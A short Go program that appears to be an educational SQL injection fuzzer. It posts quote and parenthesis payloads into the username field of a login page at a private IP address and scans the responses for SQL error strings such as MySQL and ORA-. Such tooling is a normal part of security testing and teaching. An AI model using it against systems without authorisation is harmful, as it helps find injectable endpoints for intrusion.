package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
)

var (
	url    string = "http://10.0.1.20:8080/WebApplication/login.jsp?debug=true"
	method string = "POST"
)

func main() {
	payloads := []string{
		"baseline",
		")",
		"(",
		"\"",
		"'",
	}
	sqlErrors := []string{
		"SQL",
		"MySQL",
		"ORA-",
		"syntax",
	}

	errRegexes := []*regexp.Regexp{}
	for _, e := range sqlErrors {
		re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e))
		errRegexes = append(errRegexes, re)
	}

	for _, payload := range payloads {
		client := new(http.Client)
		body := []byte(fmt.Sprintf("username=%s&password=p", payload))
		req, err := http.NewRequest(
			method,
			url,
			bytes.NewReader(body),
		)
		if err != nil {
			log.Fatalf("[!] Unable to generate request: %s\n", err)
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err != nil {
			log.Fatalf("[!] Unable to process response: %s\n", err)
		}
		body, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("[!] Unable to read response body: %s\n", err)
		}
		resp.Body.Close()

		for idx, re := range errRegexes {
			// Testing the response body for the presence of your SQL error keywords
			// If you get a match, you probably have a SQL injection error message
			if re.MatchString(string(body)) {
				fmt.Printf(
					"[+] SQL Error found ('%s') for payload: %s\n",
					sqlErrors[idx],
					payload,
				)
				break
			}
		}
	}
}
